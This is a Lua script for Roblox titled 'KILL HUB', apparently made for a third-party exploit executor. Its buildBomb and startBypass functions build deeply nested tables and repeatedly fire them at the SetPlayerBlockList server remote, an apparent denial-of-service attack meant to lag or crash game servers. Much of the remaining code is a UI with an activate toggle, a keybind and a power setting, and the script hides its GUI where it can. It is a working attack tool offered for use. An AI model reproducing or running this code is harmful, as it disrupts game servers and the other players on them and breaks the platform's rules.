if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer
local PlayerGui = LP:WaitForChild("PlayerGui")

local CONFIG_FILE = "KillHubConfig.json"
local DEPTH = 296
local SPAM_DELAY = 0.12

local State = {
	keybind = Enum.KeyCode.C,
	power = 97000,
	powerPC = 97000,
	powerMobile = 72000,
	active = false,
	_thread = nil,
	_bomb = nil,
}

local isMobileMode = false
local uiLocked = false
local listening = false

local function loadConfig()
	pcall(function()
		if type(isfile) ~= "function" or not isfile(CONFIG_FILE) then return end
		local d = HttpService:JSONDecode(readfile(CONFIG_FILE))
		if type(d) ~= "table" then return end
		if type(d.Keybind) == "string" and Enum.KeyCode[d.Keybind] then
			State.keybind = Enum.KeyCode[d.Keybind]
		end
		if type(d.power) == "number" then
			State.power = math.clamp(math.floor(d.power), 1, 999999)
		end
		if type(d.powerPC) == "number" then
			State.powerPC = math.clamp(math.floor(d.powerPC), 1, 999999)
		end
		if type(d.powerMobile) == "number" then
			State.powerMobile = math.clamp(math.floor(d.powerMobile), 1, 999999)
		end
		if type(d.MobileMode) == "boolean" then
			isMobileMode = d.MobileMode
		end
	end)
end

local function saveConfig()
	pcall(function()
		if type(writefile) ~= "function" then return end
		writefile(CONFIG_FILE, HttpService:JSONEncode({
			Keybind = State.keybind.Name,
			power = State.power,
			powerPC = State.powerPC,
			powerMobile = State.powerMobile,
			MobileMode = isMobileMode,
		}))
	end)
end

loadConfig()

local function buildBomb(power)
	local maintable, spammedtable = {}, {}
	table.insert(spammedtable, {})
	local z = spammedtable[1]
	for _ = 1, DEPTH do
		local t = {}
		table.insert(z, t)
		z = t
	end
	local maxRep = math.max(1, math.floor((tonumber(power) or 70000) / (DEPTH + 2)))
	for _ = 1, maxRep do
		table.insert(maintable, spammedtable)
	end
	return maintable
end

local function stopBypass()
	State.active = false
	if State._thread then
		pcall(task.cancel, State._thread)
		State._thread = nil
	end
	State._bomb = nil
end

local function startBypass()
	stopBypass()
	State.active = true
	State._bomb = buildBomb(State.power)
	State._thread = task.spawn(function()
		while State.active do
			local b = State._bomb
			if b then
				pcall(function()
					game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(b)
				end)
			end
			task.wait(SPAM_DELAY)
		end
	end)
end

local function toggleBypass()
	if State.active then
		stopBypass()
	else
		startBypass()
	end
	return State.active
end

local function getGuiParent()
	local parent = nil
	pcall(function()
		if typeof(gethui) == "function" then
			parent = gethui()
		end
	end)
	if parent then return parent end
	pcall(function()
		parent = game:GetService("CoreGui")
	end)
	if parent then return parent end
	return PlayerGui
end

local targetParent = getGuiParent()

pcall(function()
	local old = targetParent:FindFirstChild("KillHub")
	if old then old:Destroy() end
	local old2 = PlayerGui:FindFirstChild("KillHub")
	if old2 then old2:Destroy() end
end)

local Gui = Instance.new("ScreenGui")
Gui.Name = "KillHub"
Gui.IgnoreGuiInset = true
Gui.ResetOnSpawn = false
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function()
	if typeof(syn) == "table" and typeof(syn.protect_gui) == "function" then
		syn.protect_gui(Gui)
	end
end)
local parented = pcall(function()
	Gui.Parent = targetParent
end)
if not parented or not Gui.Parent then
	Gui.Parent = PlayerGui
end

local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Active = true
Main.ClipsDescendants = true
Main.Position = UDim2.new(0.5, -110, 0.5, -77)
Main.Size = UDim2.new(0, 220, 0, 155)
Main.BackgroundColor3 = Color3.fromRGB(6, 6, 6)
Main.BorderSizePixel = 0
Main.Parent = Gui
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 14)
local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(30, 30, 30)
MainStroke.Thickness = 1.5
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MainStroke.Transparency = 0.289
MainStroke.Parent = Main

local Bg = Instance.new("ImageLabel")
Bg.ZIndex = 0
Bg.Size = UDim2.new(1, 0, 1, 0)
Bg.BackgroundTransparency = 1
Bg.Image = "rbxassetid://124875071769737"
Bg.ImageColor3 = Color3.fromRGB(40, 40, 40)
Bg.ImageTransparency = 0.3
Bg.Parent = Main
Instance.new("UICorner", Bg).CornerRadius = UDim.new(0, 14)

local Header = Instance.new("Frame")
Header.Name = "Header"
Header.ZIndex = 2
Header.Size = UDim2.new(1, 0, 0, 36)
Header.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
Header.BorderSizePixel = 0
Header.Parent = Main
Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 14)
local HeaderFill = Instance.new("Frame")
HeaderFill.ZIndex = 2
HeaderFill.Position = UDim2.new(0, 0, 0.5, 0)
HeaderFill.Size = UDim2.new(1, 0, 0.5, 0)
HeaderFill.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
HeaderFill.BorderSizePixel = 0
HeaderFill.Parent = Header

local Title = Instance.new("TextLabel")
Title.ZIndex = 3
Title.Position = UDim2.new(0, 12, 0, 0)
Title.Size = UDim2.new(1, -120, 1, 0)
Title.BackgroundTransparency = 1
Title.Text = "KILL HUB"
Title.TextColor3 = Color3.fromRGB(182, 182, 182)
Title.TextSize = 16
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local LockBtn = Instance.new("TextButton")
LockBtn.Name = "LockBtn"
LockBtn.ZIndex = 3
LockBtn.Position = UDim2.new(1, -62, 0.5, -9)
LockBtn.Size = UDim2.new(0, 26, 0, 18)
LockBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
LockBtn.BorderSizePixel = 0
LockBtn.Text = "LOCK"
LockBtn.TextColor3 = Color3.fromRGB(80, 80, 80)
LockBtn.TextSize = 7
LockBtn.Font = Enum.Font.GothamBold
LockBtn.AutoButtonColor = false
LockBtn.Parent = Header
Instance.new("UICorner", LockBtn).CornerRadius = UDim.new(0, 5)
local LockStroke = Instance.new("UIStroke")
LockStroke.Color = Color3.fromRGB(30, 30, 30)
LockStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
LockStroke.Parent = LockBtn

local MinBtn = Instance.new("TextButton")
MinBtn.Name = "MinBtn"
MinBtn.ZIndex = 3
MinBtn.Position = UDim2.new(1, -32, 0.5, -9)
MinBtn.Size = UDim2.new(0, 26, 0, 18)
MinBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MinBtn.BorderSizePixel = 0
MinBtn.Text = "-"
MinBtn.TextColor3 = Color3.fromRGB(192, 192, 192)
MinBtn.TextSize = 14
MinBtn.Font = Enum.Font.GothamBold
MinBtn.AutoButtonColor = false
MinBtn.Parent = Header
Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 5)
Instance.new("UIStroke", MinBtn).Color = Color3.fromRGB(30, 30, 30)

local Line = Instance.new("Frame")
Line.Position = UDim2.new(0, 12, 0, 36)
Line.Size = UDim2.new(1, -24, 0, 1)
Line.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Line.BorderSizePixel = 0
Line.Parent = Main

local ModeRow = Instance.new("Frame")
ModeRow.Name = "ModeRow"
ModeRow.ZIndex = 3
ModeRow.Position = UDim2.new(0, 12, 0, 46)
ModeRow.Size = UDim2.new(1, -24, 0, 24)
ModeRow.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
ModeRow.BorderSizePixel = 0
ModeRow.Parent = Main
Instance.new("UICorner", ModeRow).CornerRadius = UDim.new(0, 7)
Instance.new("UIStroke", ModeRow).Color = Color3.fromRGB(30, 30, 30)

local ModeSlider = Instance.new("Frame")
ModeSlider.Name = "ModeSlider"
ModeSlider.ZIndex = 4
ModeSlider.Position = UDim2.new(0, 2, 0, 2)
ModeSlider.Size = UDim2.new(0.5, -3, 1, -4)
ModeSlider.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ModeSlider.BorderSizePixel = 0
ModeSlider.Parent = ModeRow
Instance.new("UICorner", ModeSlider).CornerRadius = UDim.new(0, 5)

local PcBtn = Instance.new("TextButton")
PcBtn.Name = "PcBtn"
PcBtn.ZIndex = 5
PcBtn.Size = UDim2.new(0.5, 0, 1, 0)
PcBtn.BackgroundTransparency = 1
PcBtn.BorderSizePixel = 0
PcBtn.Text = "PC"
PcBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
PcBtn.TextSize = 10
PcBtn.Font = Enum.Font.GothamMedium
PcBtn.Parent = ModeRow

local MobBtn = Instance.new("TextButton")
MobBtn.Name = "MobBtn"
MobBtn.ZIndex = 5
MobBtn.Position = UDim2.new(0.5, 0, 0, 0)
MobBtn.Size = UDim2.new(0.5, 0, 1, 0)
MobBtn.BackgroundTransparency = 1
MobBtn.BorderSizePixel = 0
MobBtn.Text = "MOBILE"
MobBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
MobBtn.TextSize = 10
MobBtn.Font = Enum.Font.GothamMedium
MobBtn.Parent = ModeRow

local PowerRow = Instance.new("Frame")
PowerRow.Name = "PowerRow"
PowerRow.ZIndex = 3
PowerRow.Position = UDim2.new(0, 12, 0, 78)
PowerRow.Size = UDim2.new(1, -24, 0, 28)
PowerRow.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
PowerRow.BorderSizePixel = 0
PowerRow.Parent = Main
Instance.new("UICorner", PowerRow).CornerRadius = UDim.new(0, 7)
Instance.new("UIStroke", PowerRow).Color = Color3.fromRGB(30, 30, 30)

local PowerLbl = Instance.new("TextLabel")
PowerLbl.ZIndex = 4
PowerLbl.Position = UDim2.new(0, 10, 0, 0)
PowerLbl.Size = UDim2.new(0, 48, 0, 28)
PowerLbl.BackgroundTransparency = 1
PowerLbl.Text = "POWER"
PowerLbl.TextColor3 = Color3.fromRGB(80, 80, 80)
PowerLbl.TextSize = 10
PowerLbl.Font = Enum.Font.GothamBold
PowerLbl.TextXAlignment = Enum.TextXAlignment.Left
PowerLbl.Parent = PowerRow

local PowerBox = Instance.new("TextBox")
PowerBox.Name = "PowerBox"
PowerBox.ZIndex = 4
PowerBox.Position = UDim2.new(0, 58, 0, 4)
PowerBox.Size = UDim2.new(1, -66, 0, 20)
PowerBox.BackgroundColor3 = Color3.fromRGB(6, 6, 6)
PowerBox.BorderSizePixel = 0
PowerBox.Text = tostring(State.power)
PowerBox.TextColor3 = Color3.fromRGB(192, 192, 192)
PowerBox.TextSize = 10
PowerBox.Font = Enum.Font.GothamBold
PowerBox.ClearTextOnFocus = false
PowerBox.Parent = PowerRow
Instance.new("UICorner", PowerBox).CornerRadius = UDim.new(0, 5)
Instance.new("UIStroke", PowerBox).Color = Color3.fromRGB(30, 30, 30)

local ActivateBtn = Instance.new("TextButton")
ActivateBtn.Name = "ActivateBtn"
ActivateBtn.ZIndex = 3
ActivateBtn.Position = UDim2.new(0, 12, 0, 115)
ActivateBtn.Size = UDim2.new(1, -24, 0, 32)
ActivateBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
ActivateBtn.BorderSizePixel = 0
ActivateBtn.Text = "ACTIVATE"
ActivateBtn.TextColor3 = Color3.fromRGB(192, 192, 192)
ActivateBtn.TextSize = 12
ActivateBtn.Font = Enum.Font.GothamBold
ActivateBtn.AutoButtonColor = false
ActivateBtn.Parent = Main
Instance.new("UICorner", ActivateBtn).CornerRadius = UDim.new(0, 10)
local ActStroke = Instance.new("UIStroke")
ActStroke.Color = Color3.fromRGB(30, 30, 30)
ActStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
ActStroke.Parent = ActivateBtn

local Mini = Instance.new("Frame")
Mini.Name = "Mini"
Mini.Visible = false
Mini.Active = true
Mini.ZIndex = 40
Mini.ClipsDescendants = true
Mini.Position = UDim2.new(0.5, -110, 0.5, -77)
Mini.Size = UDim2.new(0, 220, 0, 96)
Mini.BackgroundColor3 = Color3.fromRGB(6, 6, 6)
Mini.BorderSizePixel = 0
Mini.Parent = Gui
Instance.new("UICorner", Mini).CornerRadius = UDim.new(0, 14)
local MiniStroke = Instance.new("UIStroke")
MiniStroke.Color = Color3.fromRGB(30, 30, 30)
MiniStroke.Thickness = 1.5
MiniStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MiniStroke.Parent = Mini

local MiniHeader = Instance.new("Frame")
MiniHeader.Name = "MiniHeader"
MiniHeader.ZIndex = 2
MiniHeader.Size = UDim2.new(1, 0, 0, 36)
MiniHeader.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
MiniHeader.BorderSizePixel = 0
MiniHeader.Parent = Mini
Instance.new("UICorner", MiniHeader).CornerRadius = UDim.new(0, 14)

local MiniTitle = Instance.new("TextLabel")
MiniTitle.ZIndex = 3
MiniTitle.Position = UDim2.new(0, 12, 0, 0)
MiniTitle.Size = UDim2.new(1, -120, 1, 0)
MiniTitle.BackgroundTransparency = 1
MiniTitle.Text = "KILL HUB"
MiniTitle.TextColor3 = Color3.fromRGB(182, 182, 182)
MiniTitle.TextSize = 16
MiniTitle.Font = Enum.Font.GothamBold
MiniTitle.TextXAlignment = Enum.TextXAlignment.Left
MiniTitle.Parent = MiniHeader

local MiniLock = Instance.new("TextButton")
MiniLock.Name = "MiniLock"
MiniLock.ZIndex = 3
MiniLock.Position = UDim2.new(1, -62, 0.5, -9)
MiniLock.Size = UDim2.new(0, 26, 0, 18)
MiniLock.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MiniLock.BorderSizePixel = 0
MiniLock.Text = "LOCK"
MiniLock.TextColor3 = Color3.fromRGB(80, 80, 80)
MiniLock.TextSize = 7
MiniLock.Font = Enum.Font.GothamBold
MiniLock.AutoButtonColor = false
MiniLock.Parent = MiniHeader
Instance.new("UICorner", MiniLock).CornerRadius = UDim.new(0, 5)
local MiniLockStroke = Instance.new("UIStroke")
MiniLockStroke.Color = Color3.fromRGB(30, 30, 30)
MiniLockStroke.Parent = MiniLock

local MiniPlus = Instance.new("TextButton")
MiniPlus.Name = "MiniPlus"
MiniPlus.ZIndex = 3
MiniPlus.Position = UDim2.new(1, -32, 0.5, -9)
MiniPlus.Size = UDim2.new(0, 26, 0, 18)
MiniPlus.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MiniPlus.BorderSizePixel = 0
MiniPlus.Text = "+"
MiniPlus.TextColor3 = Color3.fromRGB(192, 192, 192)
MiniPlus.TextSize = 14
MiniPlus.Font = Enum.Font.GothamBold
MiniPlus.AutoButtonColor = false
MiniPlus.Parent = MiniHeader
Instance.new("UICorner", MiniPlus).CornerRadius = UDim.new(0, 5)
Instance.new("UIStroke", MiniPlus).Color = Color3.fromRGB(30, 30, 30)

local MiniAct = Instance.new("TextButton")
MiniAct.Name = "MiniAct"
MiniAct.ZIndex = 3
MiniAct.Position = UDim2.new(0, 12, 0, 46)
MiniAct.Size = UDim2.new(1, -24, 0, 40)
MiniAct.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MiniAct.BorderSizePixel = 0
MiniAct.Text = "ACTIVATE"
MiniAct.TextColor3 = Color3.fromRGB(192, 192, 192)
MiniAct.TextSize = 12
MiniAct.Font = Enum.Font.GothamBold
MiniAct.AutoButtonColor = false
MiniAct.Parent = Mini
Instance.new("UICorner", MiniAct).CornerRadius = UDim.new(0, 10)
local MiniActStroke = Instance.new("UIStroke")
MiniActStroke.Color = Color3.fromRGB(30, 30, 30)
MiniActStroke.Parent = MiniAct

local function setLocked(on)
	uiLocked = on == true
	local col = uiLocked and Color3.fromRGB(192, 192, 192) or Color3.fromRGB(80, 80, 80)
	LockBtn.TextColor3 = col
	MiniLock.TextColor3 = col
	LockStroke.Color = uiLocked and Color3.fromRGB(80, 80, 80) or Color3.fromRGB(30, 30, 30)
	MiniLockStroke.Color = uiLocked and Color3.fromRGB(80, 80, 80) or Color3.fromRGB(30, 30, 30)
end

local function updateActivateUI()
	if State.active then
		ActivateBtn.Text = "DEACTIVATE"
		ActivateBtn.TextColor3 = Color3.fromRGB(40, 255, 80)
		ActivateBtn.BackgroundColor3 = Color3.fromRGB(12, 22, 14)
		MiniAct.Text = "DEACTIVATE"
		MiniAct.TextColor3 = Color3.fromRGB(40, 255, 80)
		MiniAct.BackgroundColor3 = Color3.fromRGB(12, 22, 14)
	else
		ActivateBtn.Text = "ACTIVATE"
		ActivateBtn.TextColor3 = Color3.fromRGB(192, 192, 192)
		ActivateBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
		MiniAct.Text = "ACTIVATE"
		MiniAct.TextColor3 = Color3.fromRGB(192, 192, 192)
		MiniAct.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
	end
end

local function applyModeUI()
	if isMobileMode then
		ModeSlider.Position = UDim2.new(0.5, 1, 0, 2)
		State.power = State.powerMobile or 72000
	else
		ModeSlider.Position = UDim2.new(0, 2, 0, 2)
		State.power = State.powerPC or 97000
	end
	PowerBox.Text = tostring(State.power)
	if State.active then
		startBypass()
	end
end

local function applyPowerFromBox()
	local n = tonumber(PowerBox.Text)
	if n then
		State.power = math.clamp(math.floor(n), 1, 999999)
		if isMobileMode then
			State.powerMobile = State.power
		else
			State.powerPC = State.power
		end
		PowerBox.Text = tostring(State.power)
		saveConfig()
		if State.active then
			startBypass()
		end
	else
		PowerBox.Text = tostring(State.power)
	end
end

local function doToggle()
	toggleBypass()
	updateActivateUI()
end

PcBtn.MouseButton1Click:Connect(function()
	isMobileMode = false
	applyModeUI()
	saveConfig()
end)

MobBtn.MouseButton1Click:Connect(function()
	isMobileMode = true
	applyModeUI()
	saveConfig()
end)

PowerBox.FocusLost:Connect(function()
	applyPowerFromBox()
end)

ActivateBtn.MouseButton1Click:Connect(doToggle)
MiniAct.MouseButton1Click:Connect(doToggle)

LockBtn.MouseButton1Click:Connect(function()
	setLocked(not uiLocked)
end)
MiniLock.MouseButton1Click:Connect(function()
	setLocked(not uiLocked)
end)

MinBtn.MouseButton1Click:Connect(function()
	Mini.Position = Main.Position
	Main.Visible = false
	Mini.Visible = true
end)

MiniPlus.MouseButton1Click:Connect(function()
	Main.Position = Mini.Position
	Mini.Visible = false
	Main.Visible = true
end)

UserInputService.InputBegan:Connect(function(input, gp)
	if listening then
		if gp then return end
		if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Unknown then
			State.keybind = input.KeyCode
			listening = false
			saveConfig()
		end
		return
	end
	if gp then return end
	if input.KeyCode == State.keybind then
		doToggle()
	elseif input.KeyCode == Enum.KeyCode.RightControl or input.KeyCode == Enum.KeyCode.Insert then
		Gui.Enabled = not Gui.Enabled
	end
end)

local function makeDrag(handle, target)
	local dragging, d0, p0 = false, nil, nil
	handle.InputBegan:Connect(function(i)
		if uiLocked then return end
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			d0 = i.Position
			p0 = target.Position
		end
	end)
	UserInputService.InputChanged:Connect(function(i)
		if uiLocked or not dragging then return end
		if i.UserInputType ~= Enum.UserInputType.MouseMovement and i.UserInputType ~= Enum.UserInputType.Touch then return end
		local d = i.Position - d0
		target.Position = UDim2.new(p0.X.Scale, p0.X.Offset + d.X, p0.Y.Scale, p0.Y.Offset + d.Y)
	end)
	UserInputService.InputEnded:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
end

makeDrag(Header, Main)
makeDrag(MiniHeader, Mini)

applyModeUI()
updateActivateUI()
setLocked(false)